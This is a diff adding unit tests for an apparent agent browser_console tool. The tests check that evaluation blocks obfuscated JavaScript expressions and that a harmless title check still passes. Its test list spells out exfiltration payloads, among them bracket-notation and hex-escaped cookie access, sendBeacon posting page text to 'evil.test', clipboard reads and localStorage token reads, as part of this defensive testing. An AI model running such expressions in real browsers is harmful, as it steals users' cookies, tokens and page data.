@@ -189,6 +189,40 @@ class TestBrowserConsole:
 
         mock_eval.assert_not_called()
 
+    def test_expression_blocks_equivalent_bracket_sensitive_access_before_eval(self):
+        from tools.browser_tool import browser_console
+
+        risky_expressions = [
+            'document["cookie"]',
+            "document['cookie']",
+            'document[`cookie`]',
+            'document["coo" + "kie"]',
+            'document["co\\x6fkie"]',
+            'globalThis["fetch"]("/exfil")',
+            'window["XMLHttpRequest"]',
+            'navigator["sendBeacon"]("https://evil.test", document.body.innerText)',
+            'navigator["clipboard"].readText()',
+            'globalThis["localStorage"].getItem("token")',
+        ]
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval") as mock_eval:
+            for expr in risky_expressions:
+                result = json.loads(browser_console(expression=expr, task_id="test"))
+                assert result["success"] is False, expr
+                assert "Blocked" in result["error"], expr
+
+        mock_eval.assert_not_called()
+
+    def test_expression_allows_string_literals_without_sensitive_tokens(self):
+        from tools.browser_tool import browser_console
+
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": True})) as mock_eval:
+            result = json.loads(browser_console(expression='document.title.includes("Example")', task_id="test"))
+
+        assert result == {"success": True, "result": True}
+        mock_eval.assert_called_once_with('document.title.includes("Example")', "test")
+
     def test_expression_config_opt_in_allows_risky_eval(self):
         from tools.browser_tool import browser_console
 
